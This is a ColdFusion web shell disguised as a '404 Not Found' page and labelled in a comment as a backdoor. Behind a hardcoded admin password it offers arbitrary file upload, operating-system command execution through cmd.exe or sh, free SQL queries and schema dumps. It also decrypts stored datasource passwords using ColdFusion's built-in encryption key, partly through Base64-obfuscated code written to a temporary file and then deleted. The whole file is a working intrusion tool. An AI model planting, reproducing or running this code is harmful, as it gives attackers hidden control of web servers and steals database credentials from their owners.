<html>
<head>
<title>404 Not Found</title>
<script>
var Base64={_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(r){var t,e,o,a,h,c,n,d="",C=0;for(r=Base64._utf8_encode(r);C<r.length;)a=(t=r.charCodeAt(C++))>>2,h=(3&t)<<4|(e=r.charCodeAt(C++))>>4,c=(15&e)<<2|(o=r.charCodeAt(C++))>>6,n=63&o,isNaN(e)?c=n=64:isNaN(o)&&(n=64),d=d+this._keyStr.charAt(a)+this._keyStr.charAt(h)+this._keyStr.charAt(c)+this._keyStr.charAt(n);return d},decode:function(r){var t,e,o,a,h,c,n="",d=0;for(r=r.replace(/[^A-Za-z0-9\+\/\=]/g,"");d<r.length;)t=this._keyStr.indexOf(r.charAt(d++))<<2|(a=this._keyStr.indexOf(r.charAt(d++)))>>4,e=(15&a)<<4|(h=this._keyStr.indexOf(r.charAt(d++)))>>2,o=(3&h)<<6|(c=this._keyStr.indexOf(r.charAt(d++))),n+=String.fromCharCode(t),64!=h&&(n+=String.fromCharCode(e)),64!=c&&(n+=String.fromCharCode(o));return n=Base64._utf8_decode(n)},_utf8_encode:function(r){r=r.replace(/\r\n/g,"\n");for(var t="",e=0;e<r.length;e++){var o=r.charCodeAt(e);o<128?t+=String.fromCharCode(o):(127<o&&o<2048?t+=String.fromCharCode(o>>6|192):(t+=String.fromCharCode(o>>12|224),t+=String.fromCharCode(o>>6&63|128)),t+=String.fromCharCode(63&o|128))}return t},_utf8_decode:function(r){for(var t="",e=0,o=c1=c2=0;e<r.length;)(o=r.charCodeAt(e))<128?(t+=String.fromCharCode(o),e++):191<o&&o<224?(c2=r.charCodeAt(e+1),t+=String.fromCharCode((31&o)<<6|63&c2),e+=2):(c2=r.charCodeAt(e+1),c3=r.charCodeAt(e+2),t+=String.fromCharCode((15&o)<<12|(63&c2)<<6|63&c3),e+=3);return t}};
</script>
</head>
<body>
<!--- Login --->

<cfif IsDefined("logout")>
	<cfset structclear(cookie)>
	<cflocation url="?login" addtoken="No">
</cfif>
<cfif IsDefined("cookie.username")>

<!--- Main --->
<cfsetting requesttimeout="9999999">
<h6 align="right"><a href="?logout">Logout</a></h6>
<cfif Server.Os.Name CONTAINS "Windows">
	<cfset slashc = "\">
<cfelse>
	<cfset slashc = "/">
</cfif>

<cfif listfirst(server.coldfusion.productversion) gte 8>
	<cfset neoxml = "neo-datasource.xml">
<cfelse>
	<cfset neoxml = "neo-query.xml">
</cfif>

<cfparam name="FORM.path" type="string" default="#expandPath(".")##slashc#" />
<h3><u>File Upload</u></h3>
<cfif isDefined("fileUpload")>
	<cffile action="upload"
		fileField="fileUpload"
		destination="#FORM.path#"
		nameConflict="overwrite">
	<p>Thankyou, your file has been uploaded.</p>
</cfif>

<form enctype="multipart/form-data" method="post">
	<input type="file" name="fileUpload"><br>
	<input type="text" name="path" size="50" value="<cfoutput>#FORM.path#</cfoutput>"><br>
	<input type="submit" name="runupload" value="Upload File">
</form>

<cftry>
	<h3><u>MAPPINGS</u></h3>
	<cfset Roots=createObject("component", "CFIDE.componentutils.cfcexplorer").getComponentRoots()>
	<cfloop index="i" from="1" to="#ArrayLen(Roots)#">
		<cfif #Roots[i].prefix# eq "">
			<cfset Roots[i].prefix="web">
		</cfif>
		<cfif Server.Os.Name CONTAINS "Windows">
			<cfset Roots[i].PHYSICALPATH=Replace(Roots[i].PHYSICALPATH,'/','\','All')>
		</cfif>
		<CFOUTPUT><b>#Roots[i].prefix#</b>: #Roots[i].PHYSICALPATH#<br></CFOUTPUT>
	</cfloop>
	<cfcatch type="any">
		<h3><u>MAPPINGS not available</u></h3>
	</cfcatch>
</cftry>

<cfset sys = createObject("java", "java.lang.System")>
<cfif sys.getProperty("coldfusion.libPath") neq "">
	<cfset ConfPath=sys.getProperty("coldfusion.libPath")>
<cfelseif sys.getProperty("derby.system.home") neq "">
	<cfset ConfPath=Replace(sys.getProperty("derby.system.home"),'db','lib')>
<cfelseif sys.getProperty("jrun.home") neq "">
	<cfset ConfPath=Replace(sys.getProperty("jrun.home"),'runtime','lib')>
<cfelse>
	<cfset ConfPath=Replace(sys.getProperty("jrun.rootdir"),'runtime','lib')>
</cfif>

<cfparam name="FORM.datasource" type="string" default="" />
<cfparam name="FORM.server" type="string" default="127.0.0.1" />
<cfparam name="FORM.query1" type="string" default="select user" />
<cfparam name="FORM.query2" type="string" default="select user" />
<cfparam name="FORM.user" type="string" default="sa" />
<cfparam name="FORM.pass" type="string" default="" />

<cfif Server.OS.Name CONTAINS "Windows">
	<cfparam name="FORM.cmd" type="string" default="ver" />
<cfelse>
	<cfparam name="FORM.cmd" type="string" default="uname -a" />
</cfif>

<cftry>
<h3><u>CMD</u></h3>
<cfset tempFile = #GetTempFile(GetTempDirectory(),"testFile")# />
<cfif IsDefined("FORM.cmd")>
	<cfif Server.OS.Name CONTAINS "Mac" or Server.OS.Name CONTAINS "Linux" or Server.OS.Name IS "UNIX">
		<cfexecute name="sh" arguments="-c ""#REReplace(cmd,"""","'","ALL")#""" outputfile="#tempFile#" timeout="2000"></cfexecute>
	<cfelseif Server.OS.Name CONTAINS "Windows">
		<cfexecute name="cmd.exe" arguments="/c #cmd#" outputfile="#tempFile#" timeout="2000"></cfexecute>
	<cfelse>
		<cfexecute name="sh" arguments="-c ""#REReplace(cmd,"""","'","ALL")#""" outputfile="#tempFile#" timeout="2000"></cfexecute>
	</cfif>
</cfif>

<form action="<cfoutput>#CGI.SCRIPT_NAME#</cfoutput>" method="post">
	<input type=text size=45 name="cmd" value="<cfif IsDefined('FORM.cmd')><cfoutput>#cmd#</cfoutput></cfif>">
	<input type=Submit value="run">
</form>

<cfif FileExists("#tempFile#") is "Yes">
<cffile action="Read" file="#tempFile#" variable="readText">
<textarea readonly cols=80 rows=20>
<CFOUTPUT>#readText#</CFOUTPUT>
</textarea>
<cffile action="Delete" file="#tempFile#">
</cfif>
<cfcatch type="any">
	<h3><u>CMD not available</u></h3>
</cfcatch>
</cftry>

<h3><u>SQL CFM</u></h3>
<form  method="post" onSubmit="query1.value = Base64.encode(query1.value);">
Datasource<br>
<cffile action="READ" file="#ConfPath##slashc##neoxml#" variable="usersRaw">
<cfset usersXML = XmlParse(usersRaw)>
<cfset advsXML = XmlSearch(usersXML, "/wddxPacket/data/array/struct/var/struct/var[@name='DRIVER' or @name='driver']" )>
<cfset dataSourceObb = ArrayNew(1)>
<cfset numUsers = ArrayLen(advsXML)>

<cfloop index="i" from="1" to="#numUsers#">
	<cfset date_example = structNew()/>
	<cfset date_example.name = advsXML[i].XMLParent.XMLParent.XMLAttributes.name/>
	<cfset date_example.driver = advsXML[i].string.XmlText/>
	<cfset dataSourceObb[i] = date_example>
</cfloop>

<select name="datasource">
<cfscript>
for( i=1; i LTE ArrayLen( dataSourceObb ); i=i+1 )
{
	if ("#FORM.datasource#" eq dataSourceObb[i].name) writeoutput('<option value="' & dataSourceObb[i].name & '" selected>' & dataSourceObb[i].name & '</option>');
	else writeoutput('<option value="' & dataSourceObb[i].name & '">' & dataSourceObb[i].name & '('& dataSourceObb[i].driver & ')' & '</option>');
}
</cfscript>
</select>

<cfif isdefined("form.runsql2")>
	<cfscript>
		FORM.query1 = ToString(toBinary("#FORM.query1#"));
	</cfscript>
	<cfquery name="sqlout" datasource="#Form.datasource#" timeout="99999999">#PreserveSingleQuotes(Form.query1)#</cfquery>
	<table border=1>
		<cfloop from="0" to="#sqlout.RecordCount#" index="row">
		<cfset intCount = 0 />
		<cfif row eq 0>
			<tr>
			<cfloop list="#sqlout.ColumnList#" index="column" delimiters=",">
			<th><cfoutput>#column#</cfoutput></th>
			</cfloop>
			</tr>
		<cfelse>
			<tr>
			<cfloop list="#sqlout.ColumnList#" index="column" delimiters=",">
				<td><cfoutput>#sqlout[column][row]#</cfoutput></td>
			</cfloop>
				</tr>
		</cfif>
		</cfloop>
	</table>
</cfif>

<cfif isdefined("form.tofile2")>
	<cfscript>
		FORM.query1 = ToString(toBinary("#FORM.query1#"));
	</cfscript>
	<cfquery name="sqlout" datasource="#Form.datasource#" timeout="99999999">#PreserveSingleQuotes(Form.query1)#</cfquery>
	<br>DONE</br>
	<table border=1>
	<cfloop from="0" to="#sqlout.RecordCount#" index="row">
		<cfif row eq 0>
			<cffile action="write" addNewLine="yes" file="#Form.sqloutput#" output="#sqlout.ColumnList#">
		<cfelse>
			<cfset myArray = ArrayNew(1)>
			<cfset i = 1 >
			<cfloop list="#sqlout.ColumnList#" index="column" delimiters=",">
				<cfset myArray[i]=TRIM(sqlout[column][row])>
			<cfset i = i + 1>
			</cfloop>
			<cffile action="append" addNewLine="yes" file="#Form.sqloutput#" output="#ArrayToList(myArray,'|')#">
		</cfif>
	</cfloop>
	</table>
</cfif>

<br>Query<br>
<input type="Text" name="query1" size="50" value="<cfoutput>#FORM.query1#</cfoutput>"><br>
<input type=Submit name="runsql2" value="run"><br><br>
<input type="text" name="sqloutput" size="50" value="<cfoutput>#FORM.path#</cfoutput>sqlout.txt"><br>
<input type=Submit name="tofile2" value="tofile">
</form>

<h3><u>SQL SCHEMA</u></h3>
<form  method="post">
Datasource<br>
<select name="datasource">
<cfscript>
for( i=1; i LTE ArrayLen( dataSourceObb ); i=i+1 )
{
	if ("#FORM.datasource#" eq dataSourceObb[i].name) writeoutput('<option value="' & dataSourceObb[i].name & '" selected>' & dataSourceObb[i].name & '</option>');
	else writeoutput('<option value="' & dataSourceObb[i].name & '">' & dataSourceObb[i].name & '('& dataSourceObb[i].driver & ')' & '</option>');
}
</cfscript>
</select>
<input type=Submit name="structure1" value="mssql">
<input type=Submit name="structure2" value="mysql">
<input type=Submit name="structure3" value="oracle">
<input type=Submit name="structure4" value="informix">
<input type=Submit name="structure5" value="postgre">
</form>

<cfif isdefined("form.structure1")>
	<cfset MyDSN = "#Form.datasource#">
	<cfquery name="databases" datasource="#MyDSN#" timeout="9999999">
		SELECT name as DATABASE_NAME FROM MASTER.dbo.sysdatabases WHERE name NOT IN ('master','msdb','tempdb')
	</cfquery>
	<cfloop query="databases">
		<cftry>
			<cfquery name="AllTables" datasource="#MyDSN#" timeout="9999999">
				SELECT [TableName] = so.name,[RowCount] = MAX(si.rows) FROM [#databases.DATABASE_NAME#]..sysobjects so, [#databases.DATABASE_NAME#]..sysindexes si WHERE so.xtype = char(85) AND si.id = OBJECT_ID(so.name) GROUP BY so.name ORDER BY 2 DESC
			</cfquery>
			<cfoutput><h3>======== #databases.DATABASE_NAME# ========</h3></cfoutput>
			<cfloop query="AllTables">
				<cfset intCount = 0 />
				<cfset myTable = #AllTables.TableName# />
				<cfquery name="ColumnsInTable" datasource="#MyDSN#" timeout="9999999">
					SELECT * FROM [#databases.DATABASE_NAME#].INFORMATION_SCHEMA.Columns WHERE TABLE_NAME = '#myTable#'
				</cfquery>
			<cfloop query="ColumnsInTable">
				<cfset intCount = intCount + 1>
				<cfset colArray[intCount]="#TRIM(COLUMN_NAME)#">
			</cfloop>
				<cfset myColumns = valueList(columnsInTable.column_name,'<br>')>
				<cfoutput><b>#myTable#</b> (#AllTables.RowCount#)<br>#myColumns#<br></cfoutput>
			</cfloop>
			<cfcatch type = "Database">
			</cfcatch>
		</cftry>
	</cfloop>
</cfif>

<cfif isdefined("form.structure2")>
	<cfset MyDSN = "#Form.datasource#">
	<cfquery name="databases" datasource="#MyDSN#" timeout="9999999">
		SELECT SCHEMA_NAME AS DATABASE_NAME FROM INFORMATION_SCHEMA.SCHEMATA WHERE SCHEMA_NAME NOT IN('information_schema','mysql')
	</cfquery>
	<cfloop query="databases">
	<cftry>
		<cfquery name="AllTables" datasource="#MyDSN#" timeout="9999999">
			SELECT TABLE_NAME,TABLE_ROWS AS RowCount FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='#databases.DATABASE_NAME#' ORDER BY TABLE_ROWS DESC
		</cfquery>
	<cfoutput><h3>======== #databases.DATABASE_NAME# ========</h3></cfoutput>
	<cfloop query="AllTables">
		<cfset intCount = 0 />
		<cfset myTable = #AllTables.TABLE_NAME# />
		<cfquery name="ColumnsInTable" datasource="#MyDSN#" timeout="9999999">
			SELECT * FROM INFORMATION_SCHEMA.Columns WHERE TABLE_NAME = '#myTable#' AND TABLE_SCHEMA='#databases.DATABASE_NAME#'
		</cfquery>
	<cfloop query="ColumnsInTable">
		<cfset intCount = intCount + 1>
		<cfset colArray[intCount]="#TRIM(COLUMN_NAME)#">
	</cfloop>
		<cfset myColumns = valueList(columnsInTable.column_name,'<br>')>
		<cfoutput><b>#myTable#</b> (#AllTables.RowCount#)<br>#myColumns#<br></cfoutput>
	</cfloop>
	<cfcatch type = "Database">
	</cfcatch>
	</cftry>
	</cfloop>
</cfif>

<cfif isdefined("form.structure3")>
	<cfset MyDSN = "#Form.datasource#">
	<cfquery name="databases" datasource="#MyDSN#" timeout="9999999">
		select USERNAME AS DATABASE_NAME from SYS.ALL_USERS WHERE USERNAME not in ('SYSTEM','SYS') order by USERNAME
	</cfquery>
	<cfloop query="databases">
	<cftry>
		<cfquery name="AllTables" datasource="#MyDSN#" timeout="9999999">
			select TABLE_NAME,NUM_ROWS AS RowCount from SYS.ALL_TABLES WHERE OWNER='#databases.DATABASE_NAME#' order by NUM_ROWS DESC
		</cfquery>
		<cfoutput><h3>======== #databases.DATABASE_NAME# ========</h3></cfoutput>
	<cfloop query="AllTables">
		<cfset intCount = 0 />
		<cfset myTable = #AllTables.TABLE_NAME# />
		<cfquery name="ColumnsInTable" datasource="#MyDSN#" timeout="9999999">
			SELECT column_name from all_tab_columns where owner='#databases.DATABASE_NAME#' and TABLE_NAME = '#myTable#'
		</cfquery>
	<cfloop query="ColumnsInTable">
		<cfset intCount = intCount + 1>
		<cfset colArray[intCount]="#TRIM(COLUMN_NAME)#">
	</cfloop>
		<cfset myColumns = valueList(columnsInTable.column_name,'<br>')>
		<cfoutput><b>#myTable#</b> (#AllTables.RowCount#)<br>#myColumns#<br></cfoutput>
	</cfloop>
	<cfcatch type = "Database">
	</cfcatch>
	</cftry>
	</cfloop>
</cfif>

<cfif isdefined("form.structure4")>
	<cfset MyDSN = "#Form.datasource#">
	<cfquery name="databases" datasource="#MyDSN#" timeout="9999999">
		select distinct OWNER AS DATABASE_NAME from SYSTABLES
	</cfquery>
	<cfloop query="databases">
	<cftry>
		<cfquery name="AllTables" datasource="#MyDSN#" timeout="9999999">
			select TABNAME AS TABLE_NAME,NROWS AS RowCount,TABID from SYSTABLES WHERE OWNER='#databases.DATABASE_NAME#' order by NROWS DESC
		</cfquery>
		<cfoutput><h3>======== #databases.DATABASE_NAME# ========</h3></cfoutput>
	<cfloop query="AllTables">
		<cfset intCount = 0 />
		<cfset myTable = #AllTables.TABLE_NAME# />
		<cfquery name="ColumnsInTable" datasource="#MyDSN#" timeout="9999999">
			SELECT colname as column_name from SYSCOLUMNS where TABID = '#AllTables.TABID#'
		</cfquery>
	<cfloop query="ColumnsInTable">
		<cfset intCount = intCount + 1>
		<cfset colArray[intCount]="#TRIM(COLUMN_NAME)#">
	</cfloop>
		<cfset myColumns = valueList(columnsInTable.column_name,'<br>')>
		<cfoutput><b>#myTable#</b> (#AllTables.RowCount#)<br>#myColumns#<br></cfoutput>
	</cfloop>
	<cfcatch type = "Database">
	</cfcatch>
	</cftry>
	</cfloop>
</cfif>

<cfif isdefined("form.structure5")>
	<cfset MyDSN = "#Form.datasource#">
	<cfquery name="databases" datasource="#MyDSN#" timeout="9999999">
		SELECT SCHEMA_NAME AS DATABASE_NAME FROM INFORMATION_SCHEMA.SCHEMATA WHERE SCHEMA_NAME NOT IN('pg_catalog','information_schema')
	</cfquery>
	<cfloop query="databases">
	<cftry>
		<cfquery name="AllTables" datasource="#MyDSN#" timeout="9999999">
			SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='#databases.DATABASE_NAME#'
		</cfquery>
		<cfoutput><h3>======== #databases.DATABASE_NAME# ========</h3></cfoutput>
	<cfloop query="AllTables">
	<cfset intCount = 0 />
	<cfset myTable = #AllTables.TABLE_NAME# />
	<cfquery name="ColumnsInTable" datasource="#MyDSN#" timeout="9999999">
		SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '#myTable#' AND TABLE_SCHEMA='#databases.DATABASE_NAME#'
	</cfquery>
	<cfquery name="CountInTable" datasource="#MyDSN#" timeout="9999999">
		SELECT count(*) as RowCount FROM "#databases.DATABASE_NAME#"."#myTable#"
	</cfquery>
	<cfloop query="ColumnsInTable">
	<cfset intCount = intCount + 1>
	<cfset colArray[intCount]="#TRIM(COLUMN_NAME)#">
	</cfloop>
	<cfset myColumns = valueList(columnsInTable.column_name,'<br>')>
	<cfoutput><b>#myTable#</b> (#CountInTable.RowCount#)<br>#myColumns#<br></cfoutput>
	</cfloop>
	<cfcatch type = "Database">
	<h1>Database Error</h1>
	</cfcatch>
	</cftry>
	</cfloop>
</cfif>

<h3><u>SQL JAVA</u></h3>
<cfif IsDefined("FORM.decode")>
	<cfif listfirst(server.coldfusion.productversion) lt 7>
		<cffile action="READ" file="#ConfPath##slashc##neoxml#" variable="usersRaw">
		<cfset usersXML = XmlParse(usersRaw)>
		<cfset advsXML = XmlSearch(usersXML, "/wddxPacket/data/array/struct/var/struct/var[@name='password' or @name='PASSWORD' or @name='username' or @name='USERNAME' or @name='url' or @name='URL' or @name='DRIVER' or @name='driver']" )>
		<cfset numUsers = ArrayLen(advsXML)>
		<cfloop index="i" from="1" to="#numUsers#">
			<cfif advsXML[i].XMLAttributes.name eq "password" AND advsXML[i].string.XmlText neq "">
				<cfset advsXML[i].string.XmlText=advsXML[i].string.XmlText>
			</cfif>
			<cfoutput>
				#advsXML[i].XMLParent.XMLParent.XMLAttributes.name#:#advsXML[i].XMLAttributes.name#:#advsXML[i].string.XmlText#<br>
			</cfoutput>
		</cfloop>
	<cfelseif listfirst(server.coldfusion.productversion) gt 9>
		<cffile action="READ" file="#ConfPath##slashc##neoxml#" variable="usersRaw">
		<cffile action="READ" file="#ConfPath##slashc#seed.properties" variable="seeddata">
		<cfset seeddata = ReReplaceNoCase(seeddata,'\s+','=','ALL')>
		<cfset seed = ListToArray(seeddata, '=')>
		<cfset usersXML = XmlParse(usersRaw)>
		<cfset advsXML = XmlSearch(usersXML, "/wddxPacket/data/array/struct/var/struct/var[@name='password' or @name='PASSWORD' or @name='username' or @name='USERNAME' or @name='url' or @name='URL' or @name='DRIVER' or @name='driver']" )>
		<cfset numUsers = ArrayLen(advsXML)>
		<cfloop index="i" from="1" to="#numUsers#">
			<cfif advsXML[i].XMLAttributes.name eq "password" AND advsXML[i].string.XmlText neq "">
				<cfset advsXML[i].string.XmlText=Decrypt(advsXML[i].string.XmlText, generate3DesKey("#seed[2]#"), "#seed[4]#", "Base64")>
			</cfif>
			<cfoutput>
				#advsXML[i].XMLParent.XMLParent.XMLAttributes.name#:#advsXML[i].XMLAttributes.name#:#advsXML[i].string.XmlText#<br>
			</cfoutput>
		</cfloop>
	<cfelse>
		<cffile action="READ" file="#ConfPath##slashc##neoxml#" variable="usersRaw">
		<cfset usersXML = XmlParse(usersRaw)>
		<cfset advsXML = XmlSearch(usersXML, "/wddxPacket/data/array/struct/var/struct/var[@name='password' or @name='PASSWORD' or @name='username' or @name='USERNAME' or @name='url' or @name='URL' or @name='DRIVER' or @name='driver']" )>
		<cfset numUsers = ArrayLen(advsXML)>
		<cfloop index="i" from="1" to="#numUsers#">
			<cfif advsXML[i].XMLAttributes.name eq "password" AND advsXML[i].string.XmlText neq "">
				<cfset advsXML[i].string.XmlText=Decrypt(advsXML[i].string.XmlText, generate3DesKey("0yJ!@1$r8p0L@r1$6yJ!@1rj"), "DESede", "Base64")>
			</cfif>
			<cfoutput>
				#advsXML[i].XMLParent.XMLParent.XMLAttributes.name#:#advsXML[i].XMLAttributes.name#:#advsXML[i].string.XmlText#<br>
			</cfoutput>
		</cfloop>
	</cfif>
</cfif>

<form  method="post">
	<input type=Submit name="decode" value="decode"><br>
</form>

<form  method="post" onSubmit="query2.value = Base64.encode(query2.value);">
Server<br>
	<input type="Text" name="server" size="50" value="<cfoutput>#FORM.server#</cfoutput>"><br>
User<br>
	<input type="Text" name="user" size="50" value="<cfoutput>#FORM.user#</cfoutput>"><br>
Pass<br>
	<input type="Text" name="pass" size="50" value="<cfoutput>#FORM.pass#</cfoutput>"><br>

<cfif IsDefined("FORM.runsql")>
	<cfscript>
		FORM.query2 = ToString(toBinary("#FORM.query2#"));
	</cfscript>
	<cfoutput>
		#FORM.query2#
	</cfoutput>
	<cfscript>
		classLoader = createObject("java", "java.lang.Class");
		classLoader.forName("sun.jdbc.odbc.JdbcOdbcDriver");
		dm = createObject("java","java.sql.DriverManager");
		con = dm.getConnection("jdbc:odbc:DRIVER={SQL Server};Database=master;Server=#FORM.server#","#FORM.user#","#FORM.pass#");
		st = con.createStatement();
		rs = st.ExecuteQuery(#FORM.query2#);
		q = createObject("java", "coldfusion.sql.QueryTable").init(rs);
	</cfscript>
	<cfdump var="#q#">
</cfif>

Query<br>
	<input type="Text" name="query2" size="50" value="<cfoutput>#FORM.query2#</cfoutput>"><br>
	<input type=Submit name="runsql" value="run">
</form>

<cfif listfirst(server.coldfusion.productversion) lt 9 and listfirst(server.coldfusion.productversion) gt 6>
	<cfset decryptDatasource = "C-#CreateUUID()#">
	<cfset decryptDatasourceContent = "PGNmc2NyaXB0Pg0KLy8gTG9naW4gYXMgYWRtaW4gZm9yIENvbGRmdXNpb24gPT4gOS4wLjENCi8vaWYgKGxpc3RmaXJzdChzZXJ2ZXIuY29sZGZ1c2lvbi5wcm9kdWN0dmVyc2lvbikgZ3QgOCkgew0KLy8JYWRtaW5PYmogPSBjcmVhdGVPYmplY3QoImNvbXBvbmVudCIsImNmaWRlLmFkbWluYXBpLmFkbWluaXN0cmF0b3IiKTsNCi8vCWFkbWluT2JqLmxvZ2luKCJwYXNzd29yZCIsImFkbWluIik7DQovL30NCg0KLy8gQ3JlYXRlIERhdGEgU291cmNlIE9iamVjdA0KaWYgKGxpc3RmaXJzdChzZXJ2ZXIuY29sZGZ1c2lvbi5wcm9kdWN0dmVyc2lvbikgbHQgOSkgew0KZGF0YVNvdXJjZU9iYj1jcmVhdGVvYmplY3QoImphdmEiLCJjb2xkZnVzaW9uLnNlcnZlci5TZXJ2aWNlRmFjdG9yeSIpLg0KICAgICAgICBnZXREYXRhc291cmNlU2VydmljZSgpLmdldERhdGFzb3VyY2VzKCk7DQogICAgICAgIHdyaXRlb3V0cHV0KCI8aDM+PHU+PGI+RGF0YXNvdXJjZSBDcmVkZW50aWFsczo8L3U+PC9oMz4iKTsNCiAgICAgICAgd3JpdGVvdXRwdXQoIjx0YWJsZT4iKTsNCi8vIExvb3AgVGhyb3VnaCBEYXRhU291cmNlcw0KZm9yKGkgaW4gZGF0YVNvdXJjZU9iYikgew0KCWlmKGxlbihkYXRhU291cmNlT2JiW2ldWyJwYXNzd29yZCJdKSl7DQoNCgkvLyBHZXQgdXJsDQoJdGhldXJsPShkYXRhU291cmNlT2JiW2ldWyJ1cmwiXSk7DQoNCgkvLyBHZXQgdXNlcm5hbWUNCgl1c2VybmFtZT0oZGF0YVNvdXJjZU9iYltpXVsidXNlcm5hbWUiXSk7DQoJZGVjcnlwdFBhc3N3b3JkPURlY3J5cHQoZGF0YVNvdXJjZU9iYltpXVsicGFzc3dvcmQiXSwgZ2VuZXJhdGUzRGVzS2V5KCIweUohQDEkcjhwMExAcjEkNnlKIUAxcmoiKSwgIkRFU2VkZSIsICJCYXNlNjQiKTsNCgkvLyBPdXRwdXQgZGF0YXNvdXJjZSB1c2VybmFtZXMsIHBhc3N3b3JkcywgYW5kIHVybHMNCgl3cml0ZW91dHB1dCgiIiAmDQoJIjx0cj48dGQ+RGF0YVNvdXJjZTogIiAmIGkgJiAiPC90ZD4iICYNCgkiPHRkPlVzZXJuYW1lOiAiICYgdXNlcm5hbWUgJiAiPC90ZD4iICYNCgkiPHRkPlBhc3N3b3JkOiAiICYgZGVjcnlwdFBhc3N3b3JkICYgIjwvdGQ+IiAmDQoJIjx0ZD5VUkw6ICIgJiB0aGV1cmwgJiAiPC90ZD48L3RyPiIpOw0KCX0NCn0NCgl3cml0ZW91dHB1dCgiPCEtLTwvdGFibGU+PGJyPi0tPiIpOw0KfQ0KPC9jZnNjcmlwdD4=">
	<cffile action="write" file="#ExpandPath(decryptDatasource)#.cfm" output="#ToString(toBinary(decryptDatasourceContent))#">
	<cfinclude template = "#decryptDatasource#.cfm">
	<cffile action="delete" file="#ExpandPath(decryptDatasource)#.cfm">
<cfelse>
	<cfset decryptDatasource = "D-#CreateUUID()#">
	<cfset decryptDatasourceContent = "PGNmc2NyaXB0Pg0KLy8gQ3JlYXRlIERhdGEgU291cmNlIE9iamVjdA0KaWYgKGxpc3RmaXJzdChzZXJ2ZXIuY29sZGZ1c2lvbi5wcm9kdWN0dmVyc2lvbikgbHQgOSkgew0KZGF0YVNvdXJjZU9iYj1jcmVhdGVvYmplY3QoImphdmEiLCJjb2xkZnVzaW9uLnNlcnZlci5TZXJ2aWNlRmFjdG9yeSIpLg0KICAgICAgICBnZXREYXRhc291cmNlU2VydmljZSgpLmdldERhdGFzb3VyY2VzKCk7DQogICAgICAgIHdyaXRlb3V0cHV0KCI8aDM+PHU+PGI+RGF0YXNvdXJjZSBDcmVkZW50aWFsczo8L3U+PC9oMz4iKTsNCiAgICAgICAgd3JpdGVvdXRwdXQoIjx0YWJsZT4iKTsNCi8vIExvb3AgVGhyb3VnaCBEYXRhU291cmNlcw0KZm9yKGkgaW4gZGF0YVNvdXJjZU9iYikgew0KCWlmKGxlbihkYXRhU291cmNlT2JiW2ldWyJwYXNzd29yZCJdKSl7DQoNCgkvLyBHZXQgdXJsDQoJdGhldXJsPShkYXRhU291cmNlT2JiW2ldWyJ1cmwiXSk7DQoNCgkvLyBHZXQgdXNlcm5hbWUNCgl1c2VybmFtZT0oZGF0YVNvdXJjZU9iYltpXVsidXNlcm5hbWUiXSk7DQoJZGVjcnlwdFBhc3N3b3JkPWRhdGFTb3VyY2VPYmJbaV1bInBhc3N3b3JkIl07DQoJLy8gT3V0cHV0IGRhdGFzb3VyY2UgdXNlcm5hbWVzLCBwYXNzd29yZHMsIGFuZCB1cmxzDQoJd3JpdGVvdXRwdXQoIiIgJg0KCSI8dHI+PHRkPkRhdGFTb3VyY2U6ICIgJiBpICYgIjwvdGQ+IiAmDQoJIjx0ZD5Vc2VybmFtZTogIiAmIHVzZXJuYW1lICYgIjwvdGQ+IiAmDQoJIjx0ZD5QYXNzd29yZDogIiAmIGRlY3J5cHRQYXNzd29yZCAmICI8L3RkPiIgJg0KCSI8dGQ+VVJMOiAiICYgdGhldXJsICYgIjwvdGQ+PC90cj4iKTsNCgl9DQp9DQoJd3JpdGVvdXRwdXQoIjwhLS08L3RhYmxlPjxicj4tLT4iKTsNCn0NCjwvY2ZzY3JpcHQ+">
	<cffile action="write" file="#ExpandPath(decryptDatasource)#.cfm" output="#ToString(toBinary(decryptDatasourceContent))#">
	<cfinclude template = "#decryptDatasource#.cfm">
	<cffile action="delete" file="#ExpandPath(decryptDatasource)#.cfm">
</cfif>

<!--- End Main --->

<cfelseif Not IsDefined("cookie.username")>
	<cfform name="articles" ENCTYPE="multipart/form-data">
		<center><table width="300" border="0">
			<tr>
				<td width="50">Username:</td>
				<td width="50"><input type="text" name="username"></td>
			</tr>
			<tr>
				<td width="50">Password:</td>
				<td width="50"><input type="password" name="password"></td>
			</tr>
			<tr>
				<td width="50">Remember:</td>
				<td width="50">
					<input type="checkbox" name="RememberMe" value="Yes" checked>
					<input type="submit" name="Process" value="Login">
					<!-- orig from mDaw bdoor -->
				</td>
			</tr>
		</table></center>
	</cfform>
	<cfif IsDefined("username")>
		<cfset member_username = "admin">
		<cfset member_password = "qwe123QWE">
	<cfif #username# neq #member_username#>
		<center>Wrong user/password!</center>
		<cfset structclear(cookie)>
	<cfelseif #password# neq #member_password#>
		<center>Wrong user/password!</center>
		<cfset structclear(cookie)>
	<cfelse>
		<cfif IsDefined("RememberMe")>
			<cfcookie name="username" value="#form.username#" expires="NEVER">
			<cfcookie name="password" value="#form.password#" expires="NEVER">
		<cfelse>
			<cfcookie name="username" value="#form.username#">
			<cfcookie name="password" value="#form.password#">
		</cfif>
		<cflocation url="?logged" addtoken="No">
	</cfif>
        </cfif>
</cfif>

<!--- End Login --->
</body>
</html>
